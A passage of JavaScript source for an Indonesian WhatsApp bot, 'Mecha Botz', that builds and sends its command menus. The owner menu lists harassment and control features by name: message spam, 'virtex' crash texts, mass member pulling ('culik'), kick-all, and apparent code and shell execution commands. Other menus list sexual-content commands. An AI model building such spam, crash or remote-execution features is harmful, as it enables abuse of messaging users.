footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 6
}
surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
}
break

case 'infomenu': case 'menuinfo':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
let textinfo = `${Ucapan} @${sender.split('@')[0]}
${sholat}

╭━━❬ *WAKTU* ❬━━━━━━❭
│ _*• ${wib}*_
│ _*• ${wit}*_
│ _*• ${wita}*_
│ _*• Tanggal : ${tampilBulan}*_
│ _*• Tanggal Islam : ${dateIslamic}*_
└─────────────────

╭━━❬ *INFO MENU* ❭
│${free} Cekprefix
│${free} Daftar nama|umur|askot|pacar
│${free} ${prefix}status
│${free} ${prefix}report
│${free} ${prefix}adeksurya
│${free} ${prefix}mypartner
│${free} ${prefix}bestiesurya
│${free} ${prefix}stats
│${free} ${prefix}limit
│${free} ${prefix}runtime
│${free} ${prefix}speed
│${free} ${prefix}owner
│${free} ${prefix}donasi
│${free} ${prefix}sewabot
│${free} ${prefix}listheroml
│${free} ${prefix}kodebahasa
│${free} ${prefix}infocreator
│${free} ${prefix}leaderboard
│${free} ${prefix}totaluser
│${free} ${prefix}totalregister
└─────────────────`
let infom = await getBuffer(`https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&text=Info Menu`)
let inf = await surya.prepareMessage(from, infom, location, {thumbnail: infom})
const buttons = [{buttonId: 'creatormecha', buttonText: {displayText: 'Creator bot'}, type: 1},
{buttonId: 'donasi', buttonText: {displayText: 'Donasi'}, type: 1}]
const buttonsMessage = {
locationMessage: inf.message.locationMessage,
contentText: textinfo,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 6
}
surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
}
break
case 'ownermenu': case 'menuowner':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
let textowner = `${Ucapan} @${sender.split('@')[0]}
${sholat}

╭━━❬ *WAKTU* ❬━━━━━━❭
│ _*• ${wib}*_
│ _*• ${wit}*_
│ _*• ${wita}*_
│ _*• Tanggal : ${tampilBulan}*_
│ _*• Tanggal Islam : ${dateIslamic}*_
└─────────────────

╭━━❬ *OWNER MENU* ❭
│${owner} ${prefix}antitagsurya [1/0]
│${owner} ${prefix}autosticker [1/0]
│${owner} ${prefix}autoimage [1/0]
│${owner} ${prefix}autocolong [1/0]
│${owner} ${prefix}autojoin [1/0]
│${owner} ${prefix}leveling [1/0]
│${owner} ${prefix}join
│${owner} ${prefix}ban @tag
│${owner} ${prefix}unban @tag
│${owner} ${prefix}self
│${owner} ${prefix}public
│${owner} ${prefix}setpp
│${owner} ${prefix}setname
│${owner} ${prefix}setbio
│${owner} ${prefix}setthumb [reply gambar]
│${owner} ${prefix}bc
│${owner} ${prefix}clearall
│${owner} ${prefix}clearbadword @tag
│${owner} ${prefix}clearwibu @tag
│${owner} ${prefix}addwibu
│${owner} ${prefix}delwibu
│${owner} ${prefix}addbadword
│${owner} ${prefix}delbadword
│${owner} ${prefix}addcmd
│${owner} ${prefix}delcmd
│${owner} ${prefix}exif nama|author
│${owner} ${prefix}spam teks|jumlah
│${owner} ${prefix}repeat teks
│${owner} ${prefix}prank
│${owner} ${prefix}virtex
│${owner} ${prefix}restart
│${owner} ${prefix}ehex teks
│${owner} ${prefix}dehex teks
│${owner} ${prefix}hex6 teks
│${owner} ${prefix}hex4 teks
│${owner} ${prefix}hex2 teks
│${owner} ${prefix}hex1 teks
│${owner} ${prefix}setprefix
│${owner} ${prefix}getvn
│${owner} ${prefix}delvn
│${owner} ${prefix}getimage
│${owner} ${prefix}delimage
│${owner} ${prefix}getvideo
│${owner} ${prefix}delvideo
│${owner} ${prefix}getstiker
│${owner} ${prefix}delstiker
│${owner} ${prefix}kodenuklir
│${owner} ${prefix}promoteall
│${owner} ${prefix}demoteall
│${owner} ${prefix}pin
│${owner} ${prefix}unpin
│${owner} ${prefix}archive
│${owner} ${prefix}unarchive
│${owner} ${prefix}readall
│${owner} ${prefix}unreadall
│${owner} ${prefix}listonline
│${owner} ${prefix}listadmin
│${owner} ${prefix}toplocal
│${owner} ${prefix}topglobal
│${owner} ${prefix}toplevel
│${owner} ${prefix}autovn
│${owner} ${prefix}autoketik
│${owner} ${prefix}autoread
│${owner} ${prefix}antidelete
│${owner} ${prefix}mode
│${owner} ${prefix}setprefix
│${owner} ${prefix}culik [id grup]
│${owner} ${prefix}kickall (masih terkunci)
│${owner} >
│${owner} $
└─────────────────`
let ownerm = await getBuffer(`https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&text=Owner Menu`)
let owne = await surya.prepareMessage(from, ownerm, location, {thumbnail: ownerm})
const buttons = [{buttonId: 'creatormecha', buttonText: {displayText: 'Creator bot'}, type: 1},
{buttonId: 'donasi', buttonText: {displayText: 'Donasi'}, type: 1}]
const buttonsMessage = {
locationMessage: owne.message.locationMessage,
contentText: textowner,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 6
}
surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
}
break
case 'premiummenu': case 'menupremium':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
let textprem = `*${Ucapan}* @${sender.split('@')[0]}
${sholat}

╭━━❬ *WAKTU* ❬━━━━━━❭
│ _*• ${wib}*_
│ _*• ${wit}*_
│ _*• ${wita}*_
│ _*• Tanggal : ${tampilBulan}*_
│ _*• Tanggal Islam : ${dateIslamic}*_
└─────────────────

╭━━❬ *PREMIUM MENU* ❭
│${prem} ${prefix}tagall
│${prem} ${prefix}hidetag
│${prem} ${prefix}igdl url
│${prem} ${prefix}swm
│${prem} ${prefix}ytmp4 url
│${prem} ${prefix}ytmp3 url
│${prem} ${prefix}fbdl url
│${prem} ${prefix}tiktokmusik url
│${prem} ${prefix}tiktokvideo url
│${prem} ${prefix}yts query
│${prem} ${prefix}ytplay query
│${prem} ${prefix}playmp4 query
│${prem} ${prefix}lirik query
│${prem} ${prefix}cuara daerah
│${prem} ${prefix}asupan
│${prem} ${prefix}storyanime
│${prem} ${prefix}tebakgambar
│${prem} ${prefix}tebakanime
│${prem} ${prefix}jadwaltvnow
│${prem} ${prefix}infogempa
│${prem} ${prefix}heroml [nama hero ML]
│${prem} ${prefix}countdown [21/05/2022]
│${prem} ${prefix}herolist
│${prem} ${prefix}hentai
│${prem} ${prefix}cekprem
│${prem} ${prefix}blowjob
│${prem} ${prefix}wancak
│${prem} ${prefix}darkjoke
│${prem} ${prefix}simih [1/0]
│${prem} ${prefix}brainly
│${prem} ${prefix}apikeycek
│${prem} ${prefix}addrespon
│${prem} ${prefix}delrespon
└─────────────────`
let premium = await getBuffer(`https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&text=Premium Menu`)
let premi = await surya.prepareMessage(from, premium, location, {thumbnail: premium})
const buttons = [{buttonId: 'creatormecha', buttonText: {displayText: 'Creator bot'}, type: 1},
{buttonId: 'donasi', buttonText: {displayText: 'Donasi'}, type: 1}]
const buttonsMessage = {
locationMessage: premi.message.locationMessage,
contentText: textprem,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 6
}
surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
}
break
case 'grupmenu': case 'menugrup': case 'groupmenu': case 'menugroup':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
let textgrup = `${Ucapan} @${sender.split('@')[0]}
${sholat}

╭━━❬ *WAKTU* ❬━━━━━━❭
│ _*• ${wib}*_
│ _*• ${wit}*_
│ _*• ${wita}*_
│ _*• Tanggal : ${tampilBulan}*_
│ _*• Tanggal Islam : ${dateIslamic}*_
└─────────────────

╭━━❬ *GROUP MENU* ❭
│${free} ${prefix}afk
│${free} ${prefix}infogrup
│${free} ${prefix}chatinfo
│${free} ${prefix}linkgc
│${free} ${prefix}getnamegrup
│${free} ${prefix}getdeskgrup
│${free} ${prefix}getppgrup
│${free} ${prefix}listbadword
│${free} ${prefix}listwibu
│${free} ${prefix}listcmd
│${owner} ${prefix}add 628xx
│${owner} ${prefix}kick @tag
│${owner} ${prefix}promote @tag
│${owner} ${prefix}demote @tag
│${owner} ${prefix}leave
│${owner} ${prefix}setdesc
│${owner} ${prefix}setgrupname
│${owner} ${prefix}setppgrup
│${owner} ${prefix}opengrup
│${owner} ${prefix}closegrup
│${owner} ${prefix}mute
│${owner} ${prefix}unmute
│${revatod} ${prefix}getpic @tag
│${revatod} ${prefix}getbio @tag
│${revatod} ${prefix}revoke
└─────────────────`
let grup = await getBuffer(`https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&text=Group Menu`)
let gru = await surya.prepareMessage(from, grup, location, {thumbnail: grup})
const buttons = [{buttonId: 'creatormecha', buttonText: {displayText: 'Creator bot'}, type: 1},
{buttonId: 'donasi', buttonText: {displayText: 'Donasi'}, type: 1}]
const buttonsMessage = {
locationMessage: gru.message.locationMessage,
contentText: textgrup,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 6
}
surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
}
break
case 'securitymenu': case 'menusecurity':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
let textsecurity = `${Ucapan} @${sender.split('@')[0]}
${sholat}

╭━━❬ *WAKTU* ❬━━━━━━❭
│ _*• ${wib}*_
│ _*• ${wit}*_
│ _*• ${wita}*_
│ _*• Tanggal : ${tampilBulan}*_
│ _*• Tanggal Islam : ${dateIslamic}*_
└─────────────────

╭━━❬ *SECURITY MENU* ❭
│${owner} ${prefix}antilinkgrup [1/0]
│${owner} ${prefix}antilinkfacebook [1/0]
│${owner} ${prefix}antilinktiktok [1/0]
│${owner} ${prefix}antilinkyoutube [1/0]
│${owner} ${prefix}antilinkinstagram [1/0]
│${owner} ${prefix}antilinktelegram [1/0]
│${owner} ${prefix}antilinkwa [1/0]
│${owner} ${prefix}welcome [1/0]
│${owner} ${prefix}left [1/0]
│${owner} ${prefix}antibadword [1/0]
│${owner} ${prefix}antiwibu [1/0]
│${owner} ${prefix}antivirtex [1/0]
│${owner} ${prefix}antibule [1/0]
│${owner} ${prefix}antilink [1/0]
│${owner} ${prefix}antiviewonce [1/0]
└─────────────────`
let security = await getBuffer(`https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&text=Security Menu`)
let securi = await surya.prepareMessage(from, security, location, {thumbnail: security})
const buttons = [{buttonId: 'creatormecha', buttonText: {displayText: 'Creator bot'}, type: 1},
{buttonId: 'donasi', buttonText: {displayText: 'Donasi'}, type: 1}]
const buttonsMessage = {
locationMessage: securi.message.locationMessage,
contentText: textsecurity,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 6
}
surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
}
break
case 'gamemenu': case 'menugame':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
let textgame = `${Ucapan} @${sender.split('@')[0]}
${sholat}

╭━━❬ *WAKTU* ❬━━━━━━❭
│ _*• ${wib}*_
│ _*• ${wit}*_
│ _*• ${wita}*_
│ _*• Tanggal : ${tampilBulan}*_
│ _*• Tanggal Islam : ${dateIslamic}*_
└─────────────────

╭━━❬ *GAME MENU* ❭
│${prem} ${prefix}tebakgambar
│${prem} ${prefix}tebakanime
│${kizora} ${prefix}tictactoe @tag
│${kizora} ${prefix}tebakkata
│${kizora} ${prefix}tebakjenaka
│${kizora} ${prefix}tebakbendera
│${kizora} ${prefix}tebaklirik
│${kizora} ${prefix}tebakkimia
│${kizora} ${prefix}siapakahaku
│${kizora} ${prefix}tebakkalimat
│${kizora} ${prefix}susunkata
│${kizora} ${prefix}tekateki
│${kizora} ${prefix}family100
│${kizora} ${prefix}caklontong
│${kizora} ${prefix}asahotak
│${kizora} ${prefix}suit
│${kizora} ${prefix}dadu
│${kizora} ${prefix}slot
│${kizora} ${prefix}adventure
│${kizora} ${prefix}usepotion
│${kizora} ${prefix}buypotion
│${kizora} ${prefix}heal
│${kizora} ${prefix}potion
│${kizora} ${prefix}level
│${free} ${prefix}buyglimit
│${free} ${prefix}buylimit
│${free} ${prefix}leaderboard
│${owner} ${prefix}toplevel
│${owner} ${prefix}topglobal
│${owner} ${prefix}toplokal
└─────────────────`
let game = await getBuffer(`https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&text=Game Menu`)
let gam = await surya.prepareMessage(from, game, location, {thumbnail: game})
const buttons = [{buttonId: 'creatormecha', buttonText: {displayText: 'Creator bot'}, type: 1},
{buttonId: 'donasi', buttonText: {displayText: 'Donasi'}, type: 1}]
const buttonsMessage = {
locationMessage: gam.message.locationMessage,
contentText: textgame,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 6
}
surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
}
break

case 'allmenu': case 'menuall':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
let ststs = await surya.getStatus(`${sender.split('@')[0]}@c.us`)
let youra = await surya.prepareMessage(from, suryaImg, image, {thumbnail: suryaImg})
let youLevel = level.getLevelingLevel(sender, _level)
let youExp = level.getLevelingXp(sender, _level)
let youRequiredExp = 10 * Math.pow(youLevel, 2) + 50 * youLevel + 100
let youRank = level.getUserRank(sender, _level)
let gambur = `https://i.ibb.co/pWkvQxf/133ae7a1cbfc.jpg`
let gambar = await getBuffer(gambur)
let kntol = await surya.prepareMessage(from, gambar, image, {thumbnail: suryaImg})
let allmenu = `_*${Ucapan}*_

*❏ About Mecha*
├⟢ _*Name : © ᴍᴇᴄʜᴀ ʙᴏᴛᴢ VIP*_
├⟢ _*Type : Nodejs*_
├⟢ _*Platform : Android*_
├⟢ _*Baterai : ${baterai.baterai}% - ${baterai.cas === 'true' ? 'Charged' : 'Not charged'}*_
├⟢ _*Device : Xiaomi*_
├⟢ _*Creator bot : @${Suryaa.split('@')[0]}*_
├⟢ _*Waktu : ${timesNow}*_
├⟢ _*Runtime : ${runtime(process.uptime())}*_
├⟢ _*Total hit : ${hit_today.length}*_
├⟢ _*Total User : ${pendaftar.length}*_
├⟢ _*Total Register : ${_registered.length}*_
└⟢ _*Versi : Mecha Botz Update Versi 19*_

*❏ Your Info*
├⟢ _*Name : ${pushname}*_
├⟢ _*Number : @${sender.split('@')[0]}*_
├⟢ _*Bio : ${ststs.status}*_
├⟢ _*Status : ${isOwner ? 'Owner' : isPremium ? 'Premium' : 'Gratisan'}*_
├⟢ _*Limit : ${isPremium ? 'Unlimited' : `${getLimit(sender, limitCount, limit)}/${limitCount}`}*_
├⟢ _*Limit game : ${cekGLimit(sender, gcount, glimit)}/${gcount}*_
├⟢ _*Balance : $${getBalance(sender, balance)}*_
├⟢ _*Expired prem : ${isOwner ? 'Permanen' : isPremium ? expired : 'Not Premium'}*_
├⟢ _*EXP : ${youExp}/${youRequiredExp}*_
├⟢ _*Level : ${youLevel}*_
├⟢ _*Rank : ${rank}*_
├⟢ _*Top rank : ${youRank}*_
└⟢ _*Group Creator : ${Mechagc}*_


${MENU}`
let almenu = await getBuffer(`https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&text=All Menu`)
let almen = await surya.prepareMessage(from, almenu, location, {thumbnail: almenu})
const buttons = [{buttonId: 'creatormecha', buttonText: {displayText: 'Creator bot'}, type: 1},
{buttonId: 'donasi', buttonText: {displayText: 'Donasi'}, type: 1}]
const buttonsMessage = {
locationMessage: almen.message.locationMessage,
contentText: allmenu,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 6
}
surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
break
case 'makermenu': case 'menumaker':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
let textmaker = `${Ucapan} @${sender.split('@')[0]}
${sholat}

╭━━❬ WAKTU ❭
│➪ ${wib}
│➪ ${wit}
│➪ ${wita}
│➪ Tanggal : ${tampilBulan}
│➪ Tanggal Islam : ${dateIslamic}
└─────────────────

╭━━❬ *MAKER MENU 1* ❭
│${revatod} galaxystyle teks
│${revatod} wetglass teks
│${revatod} multicolor3d teks
│${revatod} watercolor teks
│${revatod} luxurygold teks
│${revatod} lighttext teks
│${revatod} beautifulflower teks
│${revatod} puppycute teks
│${revatod} royaltext teks
│${revatod} heartshaped teks
│${revatod} birthdaycake teks
│${revatod} hologram3d teks
│${revatod} glossychrome teks
│${revatod} greenbush teks
│${revatod} metallogo teks
│${revatod} noeltext teks
│${revatod} glittergold teks
│${revatod} textcake teks
│${revatod} starsnightteks
│${revatod} wooden3d teks
│${revatod} textbyname teks
│${revatod} writegalacy teks
│${revatod} galaxy bat teks
│${revatod} snow3d teks
│${revatod} birthdayday teks
│${revatod} goldplaybutton teks
│${revatod} silverplaybutton teks
│${revatod} freefire teks
└─────────────────
╭━━❬ *MAKER MENU 2* ❭
│${revatod} ${prefix}blackpink teks
│${revatod} ${prefix}mlmaker teks
│${revatod} ${prefix}logogaming teks
│${revatod} ${prefix}pubgmaskot teks
│${revatod} ${prefix}anonymhacker teks
│${revatod} ${prefix}bannerlol teks
│${revatod} ${prefix}fpslogo teks
│${revatod} ${prefix}hartacustom teks
│${revatod} ${prefix}aovwall teks
│${revatod} ${prefix}tahta teks
│${revatod} ${prefix}neon teks
│${revatod} ${prefix}thunder teks
│${revatod} ${prefix}cloud teks
│${revatod} ${prefix}holographic teks
│${revatod} ${prefix}bokeh teks
│${revatod} ${prefix}sandwriting teks
│${revatod} ${prefix}sandsummer teks
│${revatod} ${prefix}futureneon teks
│${revatod} ${prefix}sandengraved teks
│${revatod} ${prefix}metaldark teks
│${revatod} ${prefix}neonlight teks
│${revatod} ${prefix}text1917 teks
│${revatod} ${prefix}minion teks
│${revatod} ${prefix}deluxesilver teks
│${revatod} ${prefix}newyearcard teks
│${revatod} ${prefix}bloodfrosted teks
│${revatod} ${prefix}halloween teks
│${revatod} ${prefix}jokerlogo teks
│${revatod} ${prefix}fireworksparkle teks
│${revatod} ${prefix}natureleaves teks
│${revatod} ${prefix}strawberry teks
│${revatod} ${prefix}box3d teks
│${revatod} ${prefix}roadwarning teks
│${revatod} ${prefix}breakwall teks
│${revatod} ${prefix}icecold teks
│${revatod} ${prefix}luxury teks
│${revatod} ${prefix}summersand teks
│${revatod} ${prefix}horrorblood teks
│${revatod} ${prefix}toxicmaker teks
│${revatod} ${prefix}glitch text1|text2
│${revatod} ${prefix}pornhub text1|text2
│${revatod} ${prefix}avenger text1|text2
│${revatod} ${prefix}space text1|text2
│${revatod} ${prefix}ninjalogo text1|text2
│${revatod} ${prefix}marvelstudio text1|text2
│${revatod} ${prefix}lionlogo text1|text2
│${revatod} ${prefix}wolflogo text1|text2
│${revatod} ${prefix}steel3d text1|text2
│${revatod} ${prefix}wallgravity text1|text2
└─────────────────`
let maker = await getBuffer(`https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&text=Maker Menu`)
let mak = await surya.prepareMessage(from, maker, location, {thumbnail: maker})
const buttons = [{buttonId: 'creatormecha', buttonText: {displayText: 'Creator bot'}, type: 1},
{buttonId: 'donasi', buttonText: {displayText: 'Donasi'}, type: 1}]
const buttonsMessage = {
locationMessage: mak.message.locationMessage,
contentText: textmaker,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 6
}
surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
}
break
case 'sertimenu': case 'menuserti':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
let textserti = `${Ucapan} @${sender.split('@')[0]}
${sholat}

╭━━❬ *WAKTU* ❬━━━━━━❭
│ _*• ${wib}*_
│ _*• ${wit}*_
│ _*• ${wita}*_
│ _*• Tanggal : ${tampilBulan}*_
│ _*• Tanggal Islam : ${dateIslamic}*_
└─────────────────

╭━━❬ *SERTI MENU* ❭
│${revatod} ${prefix}bucinserti nama
│${revatod} ${prefix}tololserti nama
│${revatod} ${prefix}fuckgirlserti nama
│${revatod} ${prefix}fuckboyserti nama
│${revatod} ${prefix}badgirlserti nama
│${revatod} ${prefix}badboyserti nama
│${revatod} ${prefix}goodgirlserti nama
│${revatod} ${prefix}goodboyserti nama
│${revatod} ${prefix}missionpassed teks1|teks2
└─────────────────`
let serti = await getBuffer(`https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&text=Serti Menu`)
let sert = await surya.prepareMessage(from, serti, location, {thumbnail: serti})
const buttons = [{buttonId: 'creatormecha', buttonText: {displayText: 'Creator bot'}, type: 1},
{buttonId: 'donasi', buttonText: {displayText: 'Donasi'}, type: 1}]
const buttonsMessage = {
locationMessage: sert.message.locationMessage,
contentText: textserti,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 6
}
surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
}
break
case 'islammenu': case 'menuislam':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
let textislam = `${Ucapan} @${sender.split('@')[0]}
${sholat}

╭━━❬ *WAKTU* ❬━━━━━━❭
│ _*• ${wib}*_
│ _*• ${wit}*_
│ _*• ${wita}*_
│ _*• Tanggal : ${tampilBulan}*_
│ _*• Tanggal Islam : ${dateIslamic}*_
└─────────────────

╭━━❬ *ISLAM MENU* ❭
│${revatod} ${prefix}kisahnabi
│${revatod} ${prefix}niatsholat
│${revatod} ${prefix}surah
│${revatod} ${prefix}asmaulhusna
│${revatod} ${prefix}ayatkursi
│${revatod} ${prefix}tahlil
│${revatod} ${prefix}quran (12/32)
│${revatod} ${prefix}quranaudio (17 32)
│${revatod} ${prefix}hadist
│${revatod} ${prefix}listdoaharian
│${revatod} ${prefix}doaharian1
│${revatod} ${prefix}doaharian2
│${revatod} ${prefix}doaharian3
│${revatod} ${prefix}doaharian4
│${revatod} ${prefix}doaharian5
│${revatod} ${prefix}doaharian6
│${revatod} ${prefix}doaharian7
│${revatod} ${prefix}doaharian8
│${revatod} ${prefix}doaharian9
│${revatod} ${prefix}doaharian10
│${revatod} ${prefix}doaharian11
│${revatod} ${prefix}doaharian12
│${revatod} ${prefix}doaharian13
│${revatod} ${prefix}doaharian14
│${revatod} ${prefix}doaharian15
│${revatod} ${prefix}doaharian16
│${revatod} ${prefix}doaharian17
│${revatod} ${prefix}doaharian18
│${revatod} ${prefix}doaharian19
│${revatod} ${prefix}doaharian20
│${revatod} ${prefix}doaharian21
│${revatod} ${prefix}doaharian22
│${revatod} ${prefix}doaharian23
│${revatod} ${prefix}doaharian24
│${revatod} ${prefix}doaharian25
│${revatod} ${prefix}doaharian26
│${revatod} ${prefix}doaharian27
│${revatod} ${prefix}doaharian28
│${revatod} ${prefix}doaharian29
│${revatod} ${prefix}doaharian30
│${revatod} ${prefix}doaharian31
│${revatod} ${prefix}doaharian33
│${revatod} ${prefix}doaharian34
│${revatod} ${prefix}doaharian35
│${revatod} ${prefix}doaharian36
└─────────────────`
let islam = await getBuffer(`https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&text=Islam Menu`)
let isla = await surya.prepareMessage(from, islam, location, {thumbnail: islam})
const buttons = [{buttonId: 'creatormecha', buttonText: {displayText: 'Creator bot'}, type: 1},
{buttonId: 'donasi', buttonText: {displayText: 'Donasi'}, type: 1}]
const buttonsMessage = {
locationMessage: isla.message.locationMessage,
contentText: textislam,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 6
}
surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
}
break
case 'semojimenu': case 'menusemoji':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
let textsemoji = `${Ucapan} @${sender.split('@')[0]}
${sholat}

╭━━❬ *WAKTU* ❬━━━━━━❭
│ _*• ${wib}*_
│ _*• ${wit}*_
│ _*• ${wita}*_
│ _*• Tanggal : ${tampilBulan}*_
│ _*• Tanggal Islam : ${dateIslamic}*_
└─────────────────

╭━━❬ *ISLAM MENU* ❭
│${revatod} ${prefix}ap
│${revatod} ${prefix}fa
│${revatod} ${prefix}go
│${revatod} ${prefix}ht
│${revatod} ${prefix}ig
│${revatod} ${prefix}mi
│${revatod} ${prefix}mo
│${revatod} ${prefix}op
│${revatod} ${prefix}pi
│${revatod} ${prefix}sa
│${revatod} ${prefix}tw
│${revatod} ${prefix}wh
└─────────────────`
let semoji = await getBuffer(`https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&text=Semoji Menu`)
let smoji = await surya.prepareMessage(from, semoji, location, {thumbnail: semoji})
